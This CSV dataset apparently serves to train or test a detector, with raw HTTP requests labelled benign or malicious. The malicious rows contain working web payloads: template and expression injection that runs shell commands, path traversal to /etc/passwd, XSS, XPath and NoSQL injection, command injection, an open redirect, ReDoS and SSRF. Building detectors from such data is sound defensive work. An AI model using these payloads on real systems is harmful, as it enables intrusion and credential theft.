label,text
benign,"POST /api/xml/createListing HTTP/1.1
Host: realestate-listings.online-property.net
Authorization: Bearer 3f9bcde712739b0e94af3d2807ec2345
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 192
Connection: close

<Listing>
  <address>742 Evergreen Terrace</address>
  <city>Springfield</city>
  <state>IL</state>
  <zip>62704</zip>
  <price>325000</price>
  <bedrooms>3</bedrooms>
  <bathrooms>2</bathrooms>
  <agent>maggie.simpson@online-property.net</agent>
</Listing>"
malicious,"PATCH /api/v1/settings/preferences HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept-Encoding: gzip, deflate
User-Agent: Wget/1.21.1
Cache-Control: no-cache
Content-Length: 288

{""language"":""en"",""timezone"":""UTC"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
malicious,"GET /file/view?template=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
Host: secure-fileshare-cloud.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://secure-fileshare-cloud.net/dashboard"
malicious,"GET /auth/callback?redirect_url=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.7
Referer: https://my-personal-blog-site.info/login
Connection: keep-alive"
malicious,"POST /api/v1/data/search HTTP/1.1
Host: analytics-deep-dive.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json, text/plain, */*
Content-Length: 119

{""query"":{""$where"":""this.username=='admin'&&this.password.match(/^a/)==true||(function(){var d=Date.now();while(Date.now()-d<5000){}return true})()""}}"
benign,"GET /blog/featured-posts/2024/march-highlight HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/blog
Connection: keep-alive"
malicious,"GET /app/dashboard HTTP/1.1
Host: access-control-center.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 $(id)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"HEAD /index.html HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /session/start HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: https://portal.cloud-data-services.ai/login
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Origin: https://portal.cloud-data-services.ai

email=ross.bennett%40mail.net&password=oakTree#88&redirect_uri=https%3A%2F%2Fportal.cloud-data-services.ai%2Fuser%2Fprofiling%2Fsummary"
malicious,"POST /api/logging/upload HTTP/1.1
Host: analytics-reporting.tech
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: */*
Content-Length: 257
Cache-Control: max-age=0
Connection: keep-alive

{""device_id"":""DV1234X9"", ""session_start"":""2024-05-20T14:22:00Z"", ""event_details"":""Session initialized\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""session_start""}"
benign,"POST /submit/form HTTP/1.1
Host: urban-data-exchange.tech
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
User-Agent: Python-urllib/3.11
Accept: */*
Connection: close

details=The+query+will+SELECT+usernames+FROM+the+database+where+accounts+are+active+and+verified."
malicious,"POST /api/comments/add HTTP/1.1
Host: urban-foodie-network.com
Content-Type: application/json
Content-Length: 163
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

{""postId"":4521,""comment"":""Delicious recipe! Check this link: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029"",""user"":""foodlover99""}"
benign,"GET /products/electronics/tv/details?id=56 HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://online-retail-store.biz/electronics/tv
Connection: close"
benign,"PUT /api/v1/user/profile/photo HTTP/1.1
Host: my-image-archive.co
Authorization: Bearer b83923bfb-5c9e-4afd-819d-fc19db84ce7b
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 210
Connection: keep-alive

{""userId"":""5219acfb"",""photoB64"":""iVBORw0KGgoAAAANSUhEUgAAAQgAAACCCAYAAADXJCOPAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEBklEQVR4nO2dS0icRRSGWwu4kKVNdolVqBYUsGx6HLElyVzXzAq1eViITYwEksxuOriag3LyFBOjIbNmVtmdk7hLupWCQIoOHJv8bvv7fjIS8fXeB4PP7+nUc9fHRtUwKLz7k1L/EdA7Cfh+m0Jt+6ytgZnyFqXT7PX4hxOELaX0qAJOkhvC0jdZf0ERekJq38A1lNdeGOFdiWxGGk7WNbmAyi6Wny9etp1NgBj6yC9biePqBqcsji/EvUxJzEOG3dfKjEK6Z2s+Enish+4wPVA0NgVjOFAFkZqRRTGMqclR/M5kE2AxME7WvAARjQDawTfU6VYKHrAuyo24hGg16qlRWG4yIMzeH1i9RiRjsJ04xQH1hSAiDXDSWnb8NXqiiJ/HXyUuAAegng+RmFyYAAQIGEG7Hpcyxk7IpEKPgJUQUAXMEByfjhEgsx8J1xjMVJzT8Z5cyDVM4JATDkgNSxNJs8l6W9ioQAQlsGwlwF4H62MC4SnvILyycfjoMmuJOuC2Fq0Am6D8RK6IvIXyC1YnxuLg/g8FJliLL2nxVAAAAABJRU5ErkJggg==""}"
benign,"GET /deals/special-offers/autumn-sale HTTP/1.1
Host: greenmarket-gourmet.info
Connection: keep-alive
Accept: text/html
Accept-Encoding: br, gzip
Accept-Language: en-US,en;q=0.8,es;q=0.5
Cookie: session=9c3197fed4a6432a8e5ab6fde3557658; cart=4a43c8b92687495f8e71697bc8493a56
Referer: https://greenmarket-gourmet.info/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
benign,"POST /api/users HTTP/1.1
Host: user-access-portal.io
Content-Type: application/json
Accept: application/json
Origin: https://user-access-portal.io
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Length: 129
Connection: keep-alive

{""username"":""harriet.marlow"",""email"":""harriet.marlow@user-access-portal.io"",""password"":""S3cureP@ssw0rd!"",""firstName"":""Harriet"",""lastName"":""Marlow""}"
benign,"POST /vote/submit HTTP/1.1
Host: localvoices.community
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: lv_session=abc123xyz789; csrftoken=yz987abc654
Referer: https://localvoices.community/polls/active
Connection: keep-alive

poll_id=159&vote_option=ChoiceA"
malicious,"POST /feedback/form_submit HTTP/1.1
Host: fast-track-logistics.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
User-Agent: Wget/1.21.1
Accept-Language: en-GB,en;q=0.9

client_id=4523&feedback_text=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&priority=normal"
benign,"GET /api/v2/items/search?query=how%20to%20bake%20bread HTTP/1.1
Host: marketplace-cloud-services.ai
User-Agent: curl/7.79.1
Accept: application/json
Cache-Control: no-cache
DNT: 1
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
malicious,"POST /v2/query/execute HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json; q=0.9, text/html
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Origin: https://online-retail-store.biz
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{""query"": ""/customers/customer[account='premium' and substring(password, 3, 1)='s']/id""}"
benign,"PUT /api/data/item123 HTTP/1.1
Host: smart-energy-mgmt.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Content-Length: 11
Accept-Language: en-US,en;q=0.9
Connection: close

Priority set"
malicious,"POST /signin HTTP/1.1
Host: urban-healthcare-services.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Referer: https://urban-healthcare-services.org/signin
Connection: keep-alive

user=patient' and substring(//users/user[1]/concat(substring(password,1,1),substring(password,5,1)),2,1)='9'&pass=password123"
benign,"GET /blog/articles/tech-trends-2024 HTTP/1.1
Host: insights.digital-horizon.news
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.8,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://insights.digital-horizon.news/blog
Cookie: user_pref=lang_en; analytics=eyJ0cmFkZXIiOiJvdXQifQ==
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not A;Brand"";v=""99"", ""Apple"";v=""16""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1"
benign,"GET /library/search?query=history+of+ancient+rome+%26+greece&lang=en%2Fus HTTP/1.1
Host: digital-library-world.org
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
malicious,"POST /member/settings HTTP/1.1
Host: interactive-streaming-platform.tv
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.151 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Charset: utf-8
Content-Length: 66
Connection: keep-alive

status_msg=Live%20now%21%0aid%0als%20-la%20%2Fdata%2Fstreams&visibility=public"
malicious,"GET /dashboard/profile HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.7
Referer: http://forum.community.game-dev-forum.org/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}#}
Connection: close"
benign,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Cache-Control: max-age=0
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.5
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://dashboard.secure-user-portal.net/app/dashboard
Cookie: session=MEi7QJ9AnR2qKzJH; csrftoken=MAvXd1m9fpVlcP1saN4vTXOZpP7WaY8p
DNT: 1
X-Requested-With: XMLHttpRequest
Sec-CH-UA: ""Firefox"";v=""113"", ""Mozilla"";v=""5"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows"""
benign,"POST /feedback/contact HTTP/1.1
Host: digitalwave-media.tv
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Connection: close
User-Agent: curl/7.88.1
Referer: https://digitalwave-media.tv/feedback
Origin: https://digitalwave-media.tv
Cookie: dwm_sid=579ac12e345f8a02c416efa4f67bc2f8

name=Samuel+Nguyen&email=samuel.nguyen%40dmedia.tv&subject=Advertising+Inquiry&message=Could+you+provide+rate+sheets+and+available+slots+for+video+ads+next+quarter%3F"
benign,"GET /products/home-garden/kitchen/blenders HTTP/1.1
Host: eco-marketplace.store
Accept: text/html,application/xhtml+xml
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Cookie: sessionToken=3f4c2a9b7d1f2c8e
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Referer: https://search.eco-marketplace.store/
Connection: keep-alive"
benign,"GET /resource/load?file=templates/email/newsletter-may2024.html HTTP/1.1
Host: marketing-assets-global.ca
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.6
Connection: keep-alive"
malicious,"POST /api/v2/profile HTTP/1.1
Host: nextgen-analytics.cloud
User-Agent: Wget/1.21.1
Accept: application/json
Content-Type: application/json
Content-Length: 89
X-Debug-Force: true

{""profile"":{""name"":""Alice"",""email"":""alice@nextgen-analytics.cloud"",""role"":""user""}}"
benign,"GET /static/v3/css/main.css HTTP/1.1
Host: media-assets-distro.net
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Cookie: session_key=4b2d1a79ccd8; last_refresh=2024-06-07T12%3A15%3A00Z
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"PUT /xmlrpc/parser HTTP/1.1
Host: validation-hub.cloud
Content-Type: application/json
Accept: application/json, text/xml, */*
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Origin: https://validation-hub.cloud
Cache-Control: max-age=0
Content-Length: 151

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"DELETE /api/v5/devices/ab12cd34ef56 HTTP/1.1
Host: smart-home-control.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...3OtQ
If-Match: ""e72fa9c""
Accept: */*
User-Agent: Python-urllib/3.10
Via: 1.1 api-gateway.smarthome-control.net
Connection: close"
benign,"HEAD /api/check/version HTTP/1.1
Host: rapid-data-solver.cloud
User-Agent: node-fetch/2.6 (+https://github.com/bitinn/node-fetch)
Accept: application/json
X-Requested-With: XMLHttpRequest"
benign,"POST /webservice/PaymentProcessor HTTP/1.1
Host: secure-payments.online-retail-store.biz
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 379
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Mobile Safari/537.36
Accept: application/soap+xml, application/xml
Connection: keep-alive
X-CSRF-Token: 7d8e0f6b5a9c4df1bc7e971d4aab82c3

<?xml version=""1.0"" encoding=""UTF-8""?>
<soapenv:Envelope xmlns:soapenv=""http://www.w3.org/2003/05/soap-envelope"">
   <soapenv:Body>
      <ProcessTransaction xmlns=""http://retail-store.biz/payments"">
         <Transaction id=""45732"">
            <Amount>159.99</Amount>
            <Currency>USD</Currency>
            <Card>
                <Number>4111111111111111</Number>
                <Expiry>2026-07</Expiry>
            </Card>
         </Transaction>
      </ProcessTransaction>
   </soapenv:Body>
</soapenv:Envelope>"
malicious,"GET /api/user/preferences HTTP/1.1
Host: media-streaming-service.tv
User-Agent: Python-urllib/3.9
Accept: */*
Cookie: pref_file=../../../../var/log/auth.log%00backup; token=9f8a7b6c5d4e3f2a
Pragma: no-cache"
malicious,"POST /settings/profile/update HTTP/1.1
Host: my-online-socialspace.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Referer: https://community.partner-network.biz/dashboard/home
Content-Length: 85
Connection: close
Cookie: authid=3c12df748ae9c56f2a3ebb9f297ff233

{""displayName"":""legituser"",""bio"":""I love coding<script>alert('XSS')</script>"",""location"":""unknown""}"
malicious,"GET /api/v1/metrics/fetch HTTP/1.1
Host: cloudcontrol-status-tracker.biz
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
X-Notification-Endpoint: http://ssrf-rebind-tryout.proxy-lab.cloud/metrics
Accept-Language: en-US,en;q=0.7
Connection: close"
benign,"POST /profile/update-contact HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----SimpleFormBoundary202406
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Length: 355
Referer: https://online-retail-store.biz/account/profile

------SimpleFormBoundary202406
Content-Disposition: form-data; name=""address_line1""

742 Evergreen Terrace
------SimpleFormBoundary202406
Content-Disposition: form-data; name=""address_line2""

Unit 15B
------SimpleFormBoundary202406
Content-Disposition: form-data; name=""city""

Springfield
------SimpleFormBoundary202406
Content-Disposition: form-data; name=""state""

IL
------SimpleFormBoundary202406
Content-Disposition: form-data; name=""zip_code""

62704
------SimpleFormBoundary202406--"
benign,"POST /user/feedback/send HTTP/1.1
Host: feedback.portal-vendor-service.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Accept-Language: en-US,en;q=0.7
User-Agent: python-requests/2.28.1
Connection: close
X-CSRF-Token: 92a3f768b6d1c4e3209d2f8b9dad3721

subject=Website+performance+issues%3A+page+loads+under+50%25+slow&message=Pages+freeze+%26+crash+occasionally%23thanks"
benign,"POST /orders/api/create HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer 32baa6f8c3624467b5c69d6f3e4b63aa
Content-Type: application/json
Idempotency-Key: 3e152aa8-6da2-4b0a-b947-6cf6adc7cce3
X-Request-ID: 0e7c6343-e25f-48ab-9c9f-8a284b4d8cde
User-Agent: curl/7.77.0
Accept: application/json
X-Client-Version: 1.9.0

{""customerId"":""9bdf63a1"",""items"":[{""sku"":""ELEC123"",""quantity"":1},{""sku"":""HOME987"",""quantity"":3}],""shipping"":""express"",""giftWrap"":false}"
benign,"GET /blog/2024/05/12/guide?title=How+to+plan+your+summer+vacation+%26+stay+safe HTTP/1.1
Host: my-hobby-blogspace.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
